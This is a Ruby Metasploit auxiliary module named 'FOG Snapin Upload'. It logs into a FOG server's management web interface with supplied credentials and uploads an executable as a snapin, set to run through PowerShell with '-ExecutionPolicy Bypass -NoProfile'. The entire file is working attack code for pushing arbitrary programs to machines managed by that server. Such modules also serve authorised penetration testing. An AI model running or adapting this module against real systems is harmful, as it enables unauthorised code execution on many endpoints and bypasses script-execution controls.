##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

    include Msf::Exploit::Remote::HttpClient 

    def initialize(info={})
        super(update_info(info,
            'Name' => 'FOG Snapin Upload',
            'Description' => %q{
                Upload an executable to a FOG server.
            },
            'Author' => [ 'jkollross' ],
            'License' => MSF_LICENSE
        ))
        register_options([OptString.new('TARGETURI', [true, 'The base path', '/'])], self.class)
    end

    def run
        uri = target_uri.path
        cookie = send_request_cgi({'uri' => normalize_uri(uri, 'management/index.php?node=home')}).get_cookies
        send_request_cgi({
            'uri' => normalize_uri(uri, 'management/index.php?node=home'),
            'method' => 'POST',
            'vars_post' => {
                'uname' => datastore['USERNAME'],
                'upass' => datastore['PASSWORD'],
                'ulang' => "English",
                'login' => ""
            },
            'cookie' => cookie
        })
        data = Rex::MIME::Message.new
        data.add_part(File.read(datastore['FILENAME']), "application/octet-stream", nil, "form-data; name=\"snapin\"; filename=\"" + datastore['FILENAME'] + "\"")
        data.add_part(datastore['FILENAME'], nil, nil, "form-data; name=\"name\"")
        data.add_part("", nil, nil, "form-data; name=\"description\"")
        data.add_part("1", nil, nil, "form-data; name=\"storagegroup\"")
        data.add_part("0", nil, nil, "form-data; name=\"packtype\"")
        data.add_part("powershell.exe", nil, nil, "form-data; name=\"argtypes\"")
        data.add_part("powershell.exe", nil, nil, "form-data; name=\"rw\"")
        data.add_part("-ExecutionPolicy Bypass -NoProfile -File", nil, nil, "form-data; name=\"rwa\"")
        data.add_part("", nil, nil, "form-data; name=\"snapinfileexist\"")
        data.add_part("", nil, nil, "form-data; name=\"args\"")
        data.add_part("", nil, nil, "form-data; name=\"timeout\"")
        data.add_part("powershell.exe -ExecutionPolicy Bypass -NoProfile -File " + datastore['FILENAME'], nil, nil, "form-data; name=\"snapincmd\"")
        data.add_part("", nil, nil, "form-data; name=\"add\"")
        send_request_cgi({
            'uri' => normalize_uri(uri, 'management/index.php?node=snapin&sub=add'),
            'method' => 'POST',
            'ctype' => "multipart/form-data; boundary=" + data.bound,
            'data' => data.to_s,
            'cookie' => cookie
        })
    end

end